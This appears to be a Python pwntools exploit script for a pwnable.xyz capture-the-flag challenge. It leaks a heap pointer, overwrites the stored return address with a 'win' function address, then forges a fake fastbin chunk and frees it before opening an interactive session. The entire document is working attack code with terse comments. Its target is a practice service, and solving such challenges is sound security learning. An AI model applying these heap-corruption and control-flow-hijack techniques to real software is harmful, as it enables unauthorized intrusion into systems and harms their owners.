from pwn import *

p = remote("svc.pwnable.xyz", 30005)

SA = lambda data : p.sendafter(b">", data)
S = lambda data : p.send(data)

win_addr = 0x00400a3e
fakeChunk_addr = 0x00601050

# Calculate &pReturnAddr from leaked &pHeapChunk
SA(b"0" * 0x2f + b"2")
pHeapChunk_addr = int(p.recvline(), 16)
pReturnAddr_addr = pHeapChunk_addr + 0x58
print(f"&pHeapChunk: {pHeapChunk_addr:016x}")
print(f"&returnAddr: {pReturnAddr_addr:016x}")

# Goal: pReturnAddr = &win
SA(b"0" * 0x2f + b"1")
S(p64(0) + p64(pReturnAddr_addr))

SA(b"0" * 0x2f + b"3") # Now pHeapChunk = &pReturnAddr
SA(b"0" * 0x2f + b"1")
S(p64(win_addr) + p64(fakeChunk_addr - 8)) # *pHeapChunk = &win, goal achieved

# # Goal: Set fake chunk size
SA(b"0" * 0x2f + b"3") # Now pHeapChunk = &fakeChunk - 8, which points to the size
SA(b"0" * 0x2f + b"1")
S(p64(0x40) + p64(fakeChunk_addr)) # *pheapChunk = 0x40, a fastbin size

# Goal: Free the chunk
SA(b"0" * 0x2f + b"3") # Now pHeapChunk = &fakeChunk
SA(b"0" * 0x2f + b"0") # Free :)

p.interactive()